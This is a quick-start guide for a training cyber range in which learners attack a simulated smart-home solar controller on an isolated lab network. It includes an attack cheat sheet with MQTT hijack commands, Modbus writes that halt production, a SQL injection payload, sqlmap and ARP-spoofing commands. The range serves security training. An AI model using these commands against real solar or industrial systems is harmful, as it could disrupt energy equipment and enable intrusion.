# Quick Start Guide - VM-Based Cyber Range

## Prerequisites

- Access to CyberRangeCZ Platform
- This repository pushed to the platform's Git instance
- Training Definition created from this repository

## Step 1: Create Training Instance

1. Log in to CyberRangeCZ Platform
2. Navigate to **Trainings**
3. Find "Smart Home PV - Cyber Range Challenge"
4. Click **Create Instance**
5. Wait for provisioning (10-15 minutes)

## Step 2: Access Your VMs

Once provisioning is complete, you'll have access to 4 VMs:

### Router VM (10.10.10.1)
- Handles network routing
- Usually no direct access needed

### Blue Team VM (10.10.10.10)
```bash
ssh debian@<blueteam-vm-ip>
# Default password provided by platform
```

**Services to check:**
```bash
systemctl status pv-controller
systemctl status mosquitto
systemctl status victim-simulator
```

### Attacker VM (10.10.10.20) - Your Main Workspace
```bash
ssh attacker@<attacker-vm-ip>
Password: attacker
```

**Quick test:**
```bash
# Scan the network
nmap -sn 10.10.10.0/24

# Scan Blue Team services
nmap -sV -p- 10.10.10.10

# Check tools
ls ~/tools/
```

### Admin Dashboard VM (10.10.10.30)
Access via web browser:
```
http://<admin-dashboard-ip>
# Or internally: http://10.10.10.30
```

## Step 3: Start Attacking

### Challenge 1: Network Reconnaissance

From the **Attacker VM**:
```bash
# Discover open ports
nmap -sV 10.10.10.10

# Test MQTT broker
mosquitto_sub -h 10.10.10.10 -t 'pv/#' -v

# Test Modbus
python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient('10.10.10.10',15002); print(c.connect())"

# Access web interface
curl http://10.10.10.10/
```

### Challenge 2: MQTT Hijacking

```bash
# Subscribe to status messages
mosquitto_sub -h 10.10.10.10 -t 'pv/status' -v

# Look for session tokens in messages

# Publish control command
mosquitto_pub -h 10.10.10.10 -t 'pv/control' -m '{"command":"HALT","token":"<stolen-token>"}'
```

### Challenge 3: Modbus Exploitation

```bash
cd ~/tools/
python3 attacker_modbus.py --target 10.10.10.10 --port 15002 --action stop
```

### Challenge 4: Web Application Attacks

```bash
# Test for SQL injection
curl -X POST http://10.10.10.10/api/admin/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR 1=1--","password":"anything"}'

# Test for XSS
# Navigate to admin dashboard and inject scripts
```

## Step 4: Monitor from Blue Team

From the **Blue Team VM**, monitor attacks:

```bash
# Watch security events
tail -f /opt/pv-controller/logs/security_events.json

# View blocked IPs
cat /opt/pv-controller/logs/blocked_ips.json

# Check failed logins
cat /opt/pv-controller/logs/failed_logins.json

# Analyze packet captures
tcpdump -r /opt/pv-controller/logs/traffic.pcap
tshark -r /opt/pv-controller/logs/mqtt_hijack.pcap
```

## Step 5: Use Admin Dashboard

Open the dashboard at `http://10.10.10.30` or `http://<admin-dashboard-ip>`

**Features:**
- Real-time PV system status
- Security event timeline
- MQTT message viewer
- Modbus traffic monitor
- Diagnostics panel

**Login (if prompted):**
- Check training materials for credentials
- Or attempt to discover via reconnaissance

## Common Issues

### Can't connect to VMs
```bash
# Check if VMs are running
# (Use platform console/dashboard)

# Verify network connectivity
ping 10.10.10.1  # Router
ping 10.10.10.10 # Blue Team
ping 10.10.10.20 # Attacker
ping 10.10.10.30 # Dashboard
```

### Services not responding
```bash
# SSH to Blue Team VM
ssh debian@10.10.10.10

# Check service status
systemctl status pv-controller
systemctl status mosquitto

# Restart if needed
sudo systemctl restart pv-controller

# View logs for errors
journalctl -u pv-controller -n 50
```

### Dashboard not loading
```bash
# SSH to Admin Dashboard VM
ssh ubuntu@10.10.10.30

# Check Nginx
systemctl status nginx

# Check if build exists
ls -la /opt/admin-dashboard/dist/

# View Nginx logs
tail -f /var/log/nginx/error.log
```

### Tools missing on Attacker VM
```bash
# Install additional tools
sudo apt update
sudo apt install <tool-name>

# Install Python packages
pip3 install <package-name>
```

## Training Flow

1. **Info Level** - Read scenario and architecture
2. **Access Level** - Connect to VMs (submit "start")
3. **Reconnaissance** - Discover services and vulnerabilities
4. **MQTT Hijacking** - Intercept and manipulate messages
5. **Modbus Exploitation** - Attack industrial protocol
6. **Session Hijacking** - Steal authentication tokens
7. **Web Attacks** - SQL injection and XSS

Each level has a flag to submit in the training platform.

## Attack Cheat Sheet

### Port Scanning
```bash
nmap -sV -p- 10.10.10.10
nmap -sU -p 1883 10.10.10.10  # UDP scan for MQTT
```

### MQTT Commands
```bash
# Subscribe
mosquitto_sub -h 10.10.10.10 -t 'pv/#' -v

# Publish
mosquitto_pub -h 10.10.10.10 -t 'pv/control' -m '{"command":"HALT"}'
```

### Modbus Commands
```python
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('10.10.10.10', port=15002)
client.connect()

# Read holding registers
result = client.read_holding_registers(address=0, count=10)
print(result.registers)

# Write coil (stop production)
client.write_coil(1, True)
```

### Web Exploitation
```bash
# Directory enumeration
dirb http://10.10.10.10/

# SQL injection test
sqlmap -u "http://10.10.10.10/api/admin/login" --data="username=admin&password=test" --batch

# Nikto scan
nikto -h http://10.10.10.10
```

### ARP Spoofing
```bash
# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# ARP spoof (victim is at 10.10.10.10)
sudo arpspoof -i eth0 -t 10.10.10.10 10.10.10.1
sudo arpspoof -i eth0 -t 10.10.10.1 10.10.10.10

# Capture traffic
sudo tcpdump -i eth0 -w capture.pcap
```

## Tips

1. **Start with reconnaissance** - Understand the network before attacking
2. **Read the documentation** - VM_ARCHITECTURE.md has detailed info
3. **Check logs** - Security events are logged on Blue Team VM
4. **Use the dashboard** - Real-time monitoring helps understand impact
5. **Save your work** - Document findings and successful exploits
6. **Be thorough** - Each attack vector teaches different techniques

## Getting Help

- **Documentation**: Check README.md, VM_ARCHITECTURE.md, MIGRATION_GUIDE.md
- **Logs**: View systemd logs on each VM
- **Platform**: Use CyberRangeCZ support if VMs don't provision
- **Training**: Review training.json for flag hints

## Success Criteria

You've successfully completed the cyber range when you:
- ✅ Accessed all three VMs
- ✅ Discovered all open ports and services
- ✅ Successfully hijacked MQTT messages
- ✅ Manipulated Modbus coils
- ✅ Exploited web application vulnerabilities
- ✅ Retrieved all flags

Good luck! 🚀
